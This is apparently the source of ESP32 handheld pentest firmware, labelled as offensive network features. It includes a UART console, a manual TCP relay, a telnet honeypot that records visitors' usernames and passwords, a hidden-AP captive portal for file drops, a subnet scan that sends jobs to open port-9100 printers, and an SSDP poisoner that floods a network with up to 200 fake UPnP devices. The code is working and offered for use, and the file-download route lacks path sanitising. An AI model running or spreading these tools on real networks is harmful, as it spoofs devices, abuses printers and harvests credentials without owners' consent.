/*
 * net_attacks — offensive network features ported from Evil-M5Project.
 *
 * 1. UART Shell       — serial bridge to UART1 (auto-detect baud)
 * 2. Reverse TCP      — connect-back TCP client relay
 * 3. Telnet Honeypot  — fake login on port 23, log keystrokes to SD
 * 4. WiFi Dead Drop   — hidden AP + captive portal for anonymous drops
 * 5. Printer Detect   — ARP scan for port 9100, send file to printer
 * 6. SSDP Poisoner    — broadcast fake UPnP NOTIFY ssdp:alive packets
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include "../sd_helper.h"
#include <deque>
#include <vector>

/* ================================================================
 *  Helpers
 * ================================================================ */

static bool need_sta(const char *msg = "connect to WiFi first")
{
    if (WiFi.status() != WL_CONNECTED) {
        ui_toast(msg, T_WARN, 1500);
        return false;
    }
    return true;
}

/* ================================================================
 *  1.  UART Shell
 * ================================================================ */

static const int BAUD_TABLE[] = {115200, 57600, 38400, 19200, 9600,
                                 4800, 2400, 1200, 300};
static constexpr int N_BAUD   = sizeof(BAUD_TABLE) / sizeof(BAUD_TABLE[0]);

/* Grove pins for Cardputer-ADV, GPIO1/2 for regular Cardputer. */
#if defined(CARDPUTER_ADV)
  static constexpr int UART_RX_PIN = 13;
  static constexpr int UART_TX_PIN = 15;
#else
  static constexpr int UART_RX_PIN = 1;
  static constexpr int UART_TX_PIN = 2;
#endif

static HardwareSerial uart1(1);

/* Auto-detect baud by testing each rate for ~2s, looking for
 * > 60% printable characters in a sample of > 20 bytes. */
static int detect_baud(void)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    ui_text(4, BODY_Y + 2, T_ACCENT, "Detecting baud...");
    ui_draw_footer("esc=cancel");

    for (int i = 0; i < N_BAUD; ++i) {
        int rate = BAUD_TABLE[i];
        ui_text(4, BODY_Y + 16, T_FG, "trying %d bps", rate);
        uart1.begin(rate, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);

        uint32_t t0 = millis();
        int total = 0, good = 0;
        while (millis() - t0 < 2000) {
            if (uart1.available()) {
                char c = uart1.read();
                total++;
                if (isprint((uint8_t)c) || c == '\r' || c == '\n') good++;
            }
            if (input_poll() == PK_ESC) { uart1.end(); return -1; }
        }
        uart1.end();
        if (total > 20 && good * 100 / total > 60) return rate;
    }
    return -1; /* nothing found */
}

void feat_uart_shell(void)
{
    ui_clear_body();
    ui_draw_status("uart", nullptr);
    ui_draw_footer("esc=exit  enter=send");

    /* Baud selection menu. */
    const int MENU_N = N_BAUD + 1;          /* 0 = Auto, 1..N = fixed */
    int sel = 0;
    bool redraw = true;
    for (;;) {
        if (redraw) {
            ui_clear_body();
            ui_text(4, BODY_Y + 2, T_ACCENT, "Baud rate:");
            for (int i = 0; i < MENU_N && i < 8; ++i) {
                uint16_t c = (i == sel) ? T_ACCENT : T_FG;
                if (i == 0)
                    ui_text(10, BODY_Y + 16 + i * 11, c, "> Auto-detect");
                else
                    ui_text(10, BODY_Y + 16 + i * 11, c, "> %d bps", BAUD_TABLE[i - 1]);
            }
            redraw = false;
        }
        uint16_t k = input_poll();
        if (k == PK_ESC)  return;
        if (k == PK_UP)   { sel = (sel + MENU_N - 1) % MENU_N; redraw = true; }
        if (k == PK_DOWN) { sel = (sel + 1) % MENU_N; redraw = true; }
        if (k == PK_ENTER) break;
    }

    int baud;
    if (sel == 0) {
        baud = detect_baud();
        if (baud <= 0) { ui_toast("no baud detected", T_BAD, 1200); return; }
    } else {
        baud = BAUD_TABLE[sel - 1];
    }

    /* Open UART1. */
    uart1.setRxBufferSize(4096);
    uart1.begin(baud, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);

    /* Scrolling display buffer. */
    std::deque<String> lines;
    String cur = "> ";
    String cmd;
    constexpr int MAX_LINES = 256;
    constexpr int ROWS = (BODY_H) / 10;

    auto render = [&]() {
        ui_clear_body();
        int total = (int)lines.size() + 1;      /* +1 for cur */
        int top = total > ROWS ? total - ROWS : 0;
        int y = BODY_Y + 2;
        for (int i = top; i < (int)lines.size(); ++i, y += 10)
            ui_text(2, y, T_FG, "%s", lines[i].c_str());
        ui_text(2, y, T_ACCENT, "%s", cur.c_str());
    };

    ui_clear_body();
    ui_text(4, BODY_Y + 2, T_GOOD, "UART @%d bps", baud);
    ui_draw_footer("esc=exit  enter=send");
    delay(400);
    render();

    /* Main loop. */
    for (;;) {
        /* Drain UART RX. */
        while (uart1.available()) {
            char c = (char)uart1.read();
            if (c == '\r') continue;
            if (c == '\n') {
                lines.push_back(cur.startsWith("> ") ? cur : String(cur));
                /* Actually we collect incoming as separate line. */
                if (lines.size() > MAX_LINES) lines.pop_front();
                cur = "";
            } else if (c >= 0x20) {
                cur += c;
            } else {
                char hex[6]; snprintf(hex, sizeof(hex), "<%02X>", (uint8_t)c);
                cur += hex;
            }
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_ENTER) {
            /* Commit current typed cmd to log + send. */
            lines.push_back(String("> ") + cmd.c_str());
            if (lines.size() > MAX_LINES) lines.pop_front();
            uart1.print(cmd);
            uart1.print("\r\n");
            cmd = "";
            cur = "> ";
            render();
        } else if (k == PK_BKSP) {
            if (cmd.length() > 0) {
                cmd.remove(cmd.length() - 1);
                cur = String("> ") + cmd;
                render();
            }
        } else if (k >= 0x20 && k < 0x7F) {
            cmd += (char)k;
            cur = String("> ") + cmd;
            render();
        }

        /* Periodic re-render if incoming data arrived. */
        static uint32_t last_render = 0;
        if (millis() - last_render > 50) {
            render();
            last_render = millis();
        }
        delay(1);
    }

    uart1.end();
    ui_toast("UART closed", T_DIM, 800);
}

/* ================================================================
 *  2.  Reverse TCP Tunnel
 * ================================================================ */

void feat_tcp_tunnel(void)
{
    radio_switch(RADIO_WIFI);
    if (!need_sta()) return;

    char host_buf[64], port_buf[8];
    if (!input_line("host:", host_buf, sizeof(host_buf))) return;
    if (!input_line("port:", port_buf, sizeof(port_buf))) return;
    int port = atoi(port_buf);
    if (port < 1 || port > 65535) { ui_toast("bad port", T_BAD, 1000); return; }

    ui_clear_body();
    ui_draw_status("wifi", "tcp");
    ui_draw_footer("esc=close");
    ui_text(4, BODY_Y + 2, T_ACCENT, "TCP %s:%d", host_buf, port);
    ui_text(4, BODY_Y + 14, T_DIM, "connecting...");

    WiFiClient cli;
    uint32_t t0 = millis();
    bool connected = false;
    while (millis() - t0 < 10000) {
        if (cli.connect(host_buf, port)) { connected = true; break; }
        if (input_poll() == PK_ESC) return;
        delay(500);
    }
    if (!connected) { ui_toast("connect failed", T_BAD, 1200); return; }

    ui_clear_body();
    ui_text(4, BODY_Y + 2, T_GOOD, "Connected to %s:%d", host_buf, port);
    ui_draw_footer("esc=close  enter=send");

    /* Simple line-mode relay. */
    String cmd;
    std::deque<String> log;
    constexpr int LOG_MAX = 128;
    constexpr int ROWS = BODY_H / 10;

    auto render = [&]() {
        int y = BODY_Y + 14;
        int start = (int)log.size() > ROWS ? (int)log.size() - ROWS : 0;
        for (int i = start; i < (int)log.size() && y < FOOTER_Y - 10; ++i, y += 10)
            ui_text(2, y, T_FG, "%s", log[i].c_str());
        ui_text(2, y, T_ACCENT, "> %s", cmd.c_str());
    };

    for (;;) {
        /* Read from server. */
        while (cli.available()) {
            String line = cli.readStringUntil('\n');
            line.trim();
            if (line.length()) {
                log.push_back(line);
                if (log.size() > LOG_MAX) log.pop_front();
            }
        }
        if (!cli.connected()) {
            ui_toast("connection closed", T_WARN, 1200);
            break;
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_ENTER) {
            cli.print(cmd + "\r\n");
            log.push_back(String("> ") + cmd);
            if (log.size() > LOG_MAX) log.pop_front();
            cmd = "";
        } else if (k == PK_BKSP && cmd.length() > 0) {
            cmd.remove(cmd.length() - 1);
        } else if (k >= 0x20 && k < 0x7F) {
            cmd += (char)k;
        }
        render();
        delay(5);
    }
    cli.stop();
}

/* ================================================================
 *  3.  Telnet Honeypot
 * ================================================================ */

static const char *HP_BANNER =
    "\r\nUbuntu 20.04.5 LTS\r\n\r\n";

static const char *HP_MOTD =
    "Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-109-generic x86_64)\r\n"
    " * Documentation:  https://help.ubuntu.com\r\n"
    " * Support:        https://ubuntu.com/advantage\r\n\r\n";

/* Read one line from a WiFiClient with echo control. */
static String hp_readline(WiFiClient &c, bool echo, uint32_t timeout_ms = 30000)
{
    String s;
    uint32_t t0 = millis();
    while (c.connected() && millis() - t0 < timeout_ms) {
        if (c.available()) {
            char ch = c.read();
            if (ch == '\r' || ch == '\n') { if (s.length()) return s; continue; }
            if (ch == 0x7F || ch == 0x08) {
                if (s.length()) { s.remove(s.length() - 1); if (echo) c.print("\b \b"); }
                continue;
            }
            s += ch;
            if (echo) c.write(ch);
        }
        delay(1);
    }
    return s;
}

/* Fake shell command responses. */
static String hp_fake_cmd(const String &cmd)
{
    if (cmd == "whoami")   return "pi";
    if (cmd == "hostname") return "ubuntu";
    if (cmd == "pwd")      return "/home/pi";
    if (cmd == "uname -a") return "Linux ubuntu 5.4.0-109-generic #123-Ubuntu SMP x86_64 GNU/Linux";
    if (cmd == "id")       return "uid=1000(pi) gid=1000(pi) groups=1000(pi),27(sudo)";
    if (cmd == "uptime")   return " 12:15:01 up 1:15,  2 users,  load average: 0.00, 0.03, 0.00";
    if (cmd.startsWith("ls"))  return "Desktop  Documents  Downloads  Music  Pictures";
    if (cmd.startsWith("cat")) return "Permission denied";
    if (cmd == "exit" || cmd == "logout") return "";
    return String(cmd) + ": command not found";
}

void feat_honeypot(void)
{
    radio_switch(RADIO_WIFI);
    if (!need_sta()) return;
    sd_mount();

    ui_clear_body();
    ui_draw_status("wifi", "honeypot");
    ui_draw_footer("esc=stop");

    WiFiServer srv(23);
    srv.begin();
    srv.setNoDelay(true);

    ui_text(4, BODY_Y + 2, T_ACCENT, "TELNET HONEYPOT :23");
    ui_text(4, BODY_Y + 14, T_FG, "IP: %s", WiFi.localIP().toString().c_str());
    ui_text(4, BODY_Y + 26, T_DIM, "Waiting for connections...");

    /* Circular display log. */
    String disp[6];
    int di = 0;
    auto show_log = [&](const char *fmt, ...) {
        char buf[60];
        va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
        disp[di % 6] = buf;
        di++;
        int y = BODY_Y + 40;
        for (int i = 0; i < 6; ++i) {
            int idx = (di + i) % 6;
            ui_text(4, y + i * 10, T_FG, "%-38s", disp[idx].c_str());
        }
    };

    /* SD log file. */
    File logf = SD.open("/poseidon/honeypot.log", FILE_APPEND);

    auto sd_log = [&](const String &ip, const String &msg) {
        if (logf) {
            logf.printf("[%lu] %s: %s\n", millis(), ip.c_str(), msg.c_str());
            logf.flush();
        }
        show_log("%s %s", ip.c_str(), msg.c_str());
    };

    uint32_t conn_count = 0;

    for (;;) {
        uint16_t k = input_poll();
        if (k == PK_ESC) break;

        WiFiClient client = srv.available();
        if (!client) { delay(10); continue; }

        conn_count++;
        String cip = client.remoteIP().toString();
        sd_log(cip, "CONNECTED");
        ui_text(4, BODY_Y + 26, T_GOOD, "Connections: %d", conn_count);

        /* Login phase. */
        client.print(HP_BANNER);
        client.print("login: ");
        String user = hp_readline(client, true);
        sd_log(cip, String("user=") + user);

        client.print("\r\nPassword: ");
        String pass = hp_readline(client, false);
        sd_log(cip, String("pass=") + pass);

        client.print("\r\n");
        client.print(HP_MOTD);

        /* Shell loop. */
        while (client.connected()) {
            if (input_poll() == PK_ESC) { client.stop(); goto done; }
            client.print("pi@ubuntu:~$ ");
            String cmd = hp_readline(client, true);
            cmd.trim();
            if (!cmd.length()) continue;
            sd_log(cip, cmd);

            if (cmd.equalsIgnoreCase("exit") || cmd.equalsIgnoreCase("logout")) {
                client.println("Goodbye.");
                break;
            }
            String resp = hp_fake_cmd(cmd);
            client.print("\r\n" + resp + "\r\n");
        }
        client.stop();
        sd_log(cip, "DISCONNECTED");
    }
done:
    if (logf) logf.close();
    srv.stop();
    ui_toast("honeypot stopped", T_DIM, 800);
}

/* ================================================================
 *  4.  WiFi Dead Drop
 * ================================================================ */

static const char DD_HTML[] PROGMEM = R"rawhtml(
<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Dead Drop</title><style>
body{background:#111;color:#ddd;font-family:monospace;text-align:center;margin:0;padding:20px}
h2{color:#0ff;text-shadow:0 0 6px #0ff}
input,textarea,button{width:100%;padding:10px;border:1px solid #0ff;background:#111;color:#0ff;font-family:monospace;display:block;box-sizing:border-box;margin:6px 0}
button{cursor:pointer}button:hover{background:#0ff;color:#111}
a{color:#0ff}
</style></head><body>
<h2>Dead Drop</h2>
<p>Anonymous file &amp; message exchange.</p>
<h3>Upload</h3>
<form method='POST' action='/up' enctype='multipart/form-data'>
<input type='file' name='f'><button type='submit'>Upload</button></form>
<h3>Leave a Note</h3>
<form method='POST' action='/note'>
<textarea name='msg' rows='3' maxlength='1024' placeholder='message...'></textarea>
<button type='submit'>Post</button></form>
<p><a href='/list'>View deposits</a></p>
</body></html>
)rawhtml";

static const char *DD_DIR = "/poseidon/deaddrop";
static WebServer *dd_web = nullptr;
static DNSServer *dd_dns = nullptr;

static void dd_setup_routes(void)
{
    dd_web->on("/", HTTP_GET, []() {
        dd_web->send_P(200, "text/html", DD_HTML);
    });

    /* Captive portal redirects. */
    dd_web->on("/generate_204", HTTP_GET, []() { dd_web->sendHeader("Location", "/"); dd_web->send(302); });
    dd_web->on("/hotspot-detect.html", HTTP_GET, []() { dd_web->sendHeader("Location", "/"); dd_web->send(302); });

    dd_web->on("/note", HTTP_POST, []() {
        String msg = dd_web->arg("msg");
        msg.trim();
        if (msg.length()) {
            char path[64];
            snprintf(path, sizeof(path), "%s/note_%lu.txt", DD_DIR, millis());
            File f = SD.open(path, FILE_WRITE);
            if (f) { f.print(msg); f.close(); }
        }
        dd_web->sendHeader("Location", "/list");
        dd_web->send(302);
    });

    dd_web->on("/list", HTTP_GET, []() {
        File dir = SD.open(DD_DIR);
        String html = "<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
                       "<style>body{background:#111;color:#ddd;font-family:monospace;padding:20px}a{color:#0ff}</style></head>"
                       "<body><h2 style='color:#0ff'>Deposits</h2><ul>";
        if (dir && dir.isDirectory()) {
            File f = dir.openNextFile();
            while (f) {
                if (!f.isDirectory()) {
                    html += "<li><a href='/get?f=" + String(f.name()) + "'>" + String(f.name()) + "</a> (" + String(f.size()) + " B)</li>";
                }
                f.close();
                f = dir.openNextFile();
            }
            dir.close();
        }
        html += "</ul><p><a href='/'>Back</a></p></body></html>";
        dd_web->send(200, "text/html", html);
    });

    dd_web->on("/get", HTTP_GET, []() {
        String name = dd_web->arg("f");
        String path = String(DD_DIR) + "/" + name;
        File f = SD.open(path);
        if (!f) { dd_web->send(404, "text/plain", "not found"); return; }
        dd_web->streamFile(f, "application/octet-stream");
        f.close();
    });

    /* File upload handler. */
    static File upFile;
    dd_web->on("/up", HTTP_POST,
        []() { dd_web->sendHeader("Location", "/list"); dd_web->send(302); },
        []() {
            HTTPUpload &u = dd_web->upload();
            if (u.status == UPLOAD_FILE_START) {
                String safe = u.filename;
                safe.replace("/", "_"); safe.replace("\\", "_"); safe.replace("..", "_");
                String path = String(DD_DIR) + "/" + safe;
                upFile = SD.open(path, FILE_WRITE);
            } else if (u.status == UPLOAD_FILE_WRITE) {
                if (upFile) upFile.write(u.buf, u.currentSize);
            } else if (u.status == UPLOAD_FILE_END) {
                if (upFile) upFile.close();
            }
        }
    );
}

void feat_dead_drop(void)
{
    radio_switch(RADIO_WIFI);
    sd_mount();
    if (!SD.exists(DD_DIR)) SD.mkdir(DD_DIR);

    char ssid_buf[32];
    if (!input_line("AP SSID (hidden):", ssid_buf, sizeof(ssid_buf))) return;

    /* Create hidden AP. */
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(ssid_buf, nullptr, 1, true /* hidden */, 8);
    delay(200);
    IPAddress apIP = WiFi.softAPIP();

    dd_dns = new DNSServer();
    dd_dns->start(53, "*", apIP);

    dd_web = new WebServer(80);
    dd_setup_routes();
    dd_web->begin();

    ui_clear_body();
    ui_draw_status("wifi", "deaddrop");
    ui_draw_footer("esc=stop");
    ui_text(4, BODY_Y + 2, T_ACCENT, "DEAD DROP");
    ui_text(4, BODY_Y + 14, T_FG, "SSID: %s (hidden)", ssid_buf);
    ui_text(4, BODY_Y + 26, T_FG, "IP:   %s", apIP.toString().c_str());
    ui_text(4, BODY_Y + 38, T_DIM, "captive portal active");

    uint32_t clients = 0;
    for (;;) {
        dd_dns->processNextRequest();
        dd_web->handleClient();

        uint32_t now_clients = WiFi.softAPgetStationNum();
        if (now_clients != clients) {
            clients = now_clients;
            ui_text(4, BODY_Y + 52, T_GOOD, "clients: %d", clients);
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        delay(1);
    }

    dd_web->stop();
    dd_dns->stop();
    delete dd_web; dd_web = nullptr;
    delete dd_dns; dd_dns = nullptr;
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    ui_toast("dead drop stopped", T_DIM, 800);
}

/* ================================================================
 *  5.  Printer Detect + Print
 * ================================================================ */

static bool probe_port(IPAddress ip, uint16_t port, uint32_t timeout = 150)
{
    WiFiClient c;
    c.setTimeout(timeout);
    if (c.connect(ip, port)) { c.stop(); return true; }
    return false;
}

void feat_printer(void)
{
    radio_switch(RADIO_WIFI);
    if (!need_sta()) return;

    ui_clear_body();
    ui_draw_status("wifi", "printer");
    ui_draw_footer("esc=cancel");

    /* Derive subnet from our IP. */
    IPAddress myIP = WiFi.localIP();
    IPAddress base = myIP;

    ui_text(4, BODY_Y + 2, T_ACCENT, "PRINTER SCAN");
    ui_text(4, BODY_Y + 14, T_FG, "subnet %d.%d.%d.x", base[0], base[1], base[2]);

    std::vector<IPAddress> found;

    for (int i = 1; i <= 254; ++i) {
        if (i % 16 == 0)
            ui_text(4, BODY_Y + 26, T_DIM, "scanning %d/254...", i);

        IPAddress t(base[0], base[1], base[2], i);
        if (probe_port(t, 9100, 100))
            found.push_back(t);

        uint16_t k = input_poll();
        if (k == PK_ESC) return;
    }

    ui_clear_body();
    if (found.empty()) {
        ui_text(4, BODY_Y + 2, T_WARN, "No printers found (port 9100)");
        ui_draw_footer("esc=back");
        while (input_poll() != PK_ESC) delay(10);
        return;
    }

    /* List found printers, let user pick one. */
    int sel = 0;
    bool redraw = true;
    for (;;) {
        if (redraw) {
            ui_clear_body();
            ui_text(4, BODY_Y + 2, T_ACCENT, "Found %d printer(s):", (int)found.size());
            for (int i = 0; i < (int)found.size() && i < 8; ++i) {
                uint16_t c = (i == sel) ? T_ACCENT : T_FG;
                ui_text(10, BODY_Y + 16 + i * 11, c, "%s", found[i].toString().c_str());
            }
            ui_draw_footer("enter=print  esc=back");
            redraw = false;
        }
        uint16_t k = input_poll();
        if (k == PK_ESC) return;
        if (k == PK_UP)   { sel = (sel + (int)found.size() - 1) % (int)found.size(); redraw = true; }
        if (k == PK_DOWN) { sel = (sel + 1) % (int)found.size(); redraw = true; }
        if (k == PK_ENTER) break;
    }

    /* Send file from SD. */
    sd_mount();
    const char *path = "/poseidon/print.txt";
    if (!SD.exists(path)) {
        ui_toast("put print.txt on SD", T_WARN, 1500);
        return;
    }

    File f = SD.open(path);
    if (!f) { ui_toast("SD read error", T_BAD, 1000); return; }

    WiFiClient printer;
    if (!printer.connect(found[sel], 9100)) {
        f.close();
        ui_toast("connect failed", T_BAD, 1200);
        return;
    }

    ui_clear_body();
    ui_text(4, BODY_Y + 2, T_ACCENT, "Printing to %s...", found[sel].toString().c_str());

    while (f.available()) {
        String line = f.readStringUntil('\n');
        printer.println(line);
    }
    f.close();
    printer.stop();

    ui_text(4, BODY_Y + 16, T_GOOD, "Print job sent!");
    ui_draw_footer("esc=back");
    while (input_poll() != PK_ESC) delay(10);
}

/* ================================================================
 *  6.  SSDP Poisoner
 * ================================================================ */

/* UPnP device type URNs to impersonate. */
static const char *SSDP_TYPES[] = {
    "urn:schemas-upnp-org:device:MediaServer:1",
    "urn:schemas-upnp-org:device:MediaRenderer:1",
    "urn:schemas-upnp-org:device:Printer:1",
    "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
    "urn:schemas-upnp-org:device:DimmableLight:1",
    "urn:schemas-upnp-org:device:Camera:1",
    "urn:schemas-upnp-org:device:Scanner:1",
    "urn:schemas-upnp-org:device:LANDevice:1",
};
static constexpr int N_SSDP_TYPES = sizeof(SSDP_TYPES) / sizeof(SSDP_TYPES[0]);

static void make_uuid(char out[37])
{
    uint8_t b[16];
    for (int i = 0; i < 16; i++) b[i] = (uint8_t)(esp_random() & 0xFF);
    b[6] = (b[6] & 0x0F) | 0x40;
    b[8] = (b[8] & 0x3F) | 0x80;
    snprintf(out, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        b[0],b[1],b[2],b[3], b[4],b[5], b[6],b[7],
        b[8],b[9], b[10],b[11],b[12],b[13],b[14],b[15]);
}

void feat_ssdp_poison(void)
{
    radio_switch(RADIO_WIFI);
    if (!need_sta()) return;

    char count_buf[8];
    if (!input_line("# fake devices (1-200):", count_buf, sizeof(count_buf))) return;
    int dev_count = atoi(count_buf);
    if (dev_count < 1) dev_count = 1;
    if (dev_count > 200) dev_count = 200;

    char name_buf[32];
    if (!input_line("device name prefix:", name_buf, sizeof(name_buf))) return;

    /* Build device table. */
    struct ssdp_dev {
        char uuid[37];
        const char *type;
    };
    std::vector<ssdp_dev> devs(dev_count);
    for (int i = 0; i < dev_count; ++i) {
        make_uuid(devs[i].uuid);
        devs[i].type = SSDP_TYPES[i % N_SSDP_TYPES];
    }

    /* Open multicast + unicast sockets. */
    WiFiUDP udpMC, udpUC;
    if (!udpMC.beginMulticast(IPAddress(239, 255, 255, 250), 1900)) {
        ui_toast("multicast bind fail", T_BAD, 1200);
        return;
    }
    udpUC.begin(1901);   /* any local port for sending */

    /* Minimal web server for device descriptions. */
    WebServer descSrv(8008);
    descSrv.onNotFound([&]() {
        String uri = descSrv.uri();
        int idx = -1;
        if (uri.startsWith("/desc") && uri.endsWith(".xml")) {
            sscanf(uri.c_str(), "/desc%d.xml", &idx);
            if (idx >= 0 && idx < dev_count) {
                IPAddress lip = WiFi.localIP();
                char friendly[48];
                snprintf(friendly, sizeof(friendly), "%s-%03d", name_buf, idx);
                char xml[700];
                snprintf(xml, sizeof(xml),
                    "<?xml version=\"1.0\"?>"
                    "<root xmlns=\"urn:schemas-upnp-org:device-1-0\">"
                    "<specVersion><major>1</major><minor>0</minor></specVersion>"
                    "<device><deviceType>%s</deviceType>"
                    "<friendlyName>%s</friendlyName>"
                    "<manufacturer>POSEIDON</manufacturer>"
                    "<modelName>%s</modelName>"
                    "<UDN>uuid:%s</UDN></device></root>",
                    devs[idx].type, friendly, friendly, devs[idx].uuid);
                descSrv.send(200, "text/xml", xml);
                return;
            }
        }
        descSrv.send(404, "text/plain", "nope");
    });
    descSrv.begin();

    ui_clear_body();
    ui_draw_status("wifi", "ssdp");
    ui_draw_footer("esc=stop");

    long searches = 0, sent = 0;
    String lastClient;

    auto redraw = [&]() {
        ui_text(4, BODY_Y + 2, T_BAD, "SSDP POISONER");
        ui_text(4, BODY_Y + 16, T_FG, "devices: %d  types: %d", dev_count, N_SSDP_TYPES);
        ui_text(4, BODY_Y + 28, T_FG, "M-SEARCH rx: %ld", searches);
        ui_text(4, BODY_Y + 40, T_FG, "replies tx:  %ld", sent);
        ui_text(4, BODY_Y + 52, T_DIM, "last: %s", lastClient.c_str());
    };
    redraw();

    /* Respond to M-SEARCH with replies for all our fake devices. */
    auto handle_sock = [&](WiFiUDP &sock) {
        int pkt = sock.parsePacket();
        if (pkt <= 0) return;

        char buf[512];
        int len = sock.read(buf, sizeof(buf) - 1);
        if (len <= 0) return;
        buf[len] = 0;

        /* Only respond to M-SEARCH. */
        String req(buf);
        String upper = req;
        upper.toUpperCase();
        if (upper.indexOf("M-SEARCH") < 0) return;

        searches++;
        IPAddress rip = sock.remoteIP();
        uint16_t rport = sock.remotePort();
        lastClient = rip.toString();
        IPAddress lip = WiFi.localIP();

        for (int i = 0; i < dev_count; ++i) {
            char loc[80];
            snprintf(loc, sizeof(loc), "http://%s:8008/desc%d.xml",
                     lip.toString().c_str(), i);

            String resp = String(
                "HTTP/1.1 200 OK\r\n"
                "CACHE-CONTROL: max-age=1800\r\n"
                "EXT:\r\n"
                "LOCATION: ") + loc + "\r\n"
                "SERVER: ESP32/1.0 UPnP/1.0 POSEIDON/0.1\r\n"
                "ST: " + devs[i].type + "\r\n"
                "USN: uuid:" + devs[i].uuid + "::" + devs[i].type + "\r\n"
                "CONTENT-LENGTH: 0\r\n\r\n";

            sock.beginPacket(rip, rport);
            sock.write((const uint8_t *)resp.c_str(), resp.length());
            sock.endPacket();
            sent++;
            delay(1);
        }
        redraw();
    };

    /* Also broadcast unsolicited NOTIFY ssdp:alive periodically. */
    uint32_t last_notify = 0;
    constexpr uint32_t NOTIFY_INTERVAL = 10000;

    for (;;) {
        handle_sock(udpMC);
        handle_sock(udpUC);
        descSrv.handleClient();

        /* Periodic NOTIFY broadcast. */
        if (millis() - last_notify > NOTIFY_INTERVAL) {
            IPAddress lip = WiFi.localIP();
            for (int i = 0; i < dev_count; ++i) {
                char loc[80];
                snprintf(loc, sizeof(loc), "http://%s:8008/desc%d.xml",
                         lip.toString().c_str(), i);

                String notify = String(
                    "NOTIFY * HTTP/1.1\r\n"
                    "HOST: 239.255.255.250:1900\r\n"
                    "CACHE-CONTROL: max-age=1800\r\n"
                    "LOCATION: ") + loc + "\r\n"
                    "NT: " + SSDP_TYPES[i % N_SSDP_TYPES] + "\r\n"
                    "NTS: ssdp:alive\r\n"
                    "SERVER: ESP32/1.0 UPnP/1.0 POSEIDON/0.1\r\n"
                    "USN: uuid:" + devs[i].uuid + "::" + devs[i].type + "\r\n\r\n";

                udpMC.beginMulticastPacket();
                udpMC.write((const uint8_t *)notify.c_str(), notify.length());
                udpMC.endPacket();
                sent++;
                delay(1);
            }
            last_notify = millis();
            redraw();
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        delay(2);
    }

    udpMC.stop();
    udpUC.stop();
    descSrv.stop();
    ui_toast("SSDP poisoner stopped", T_DIM, 800);
}
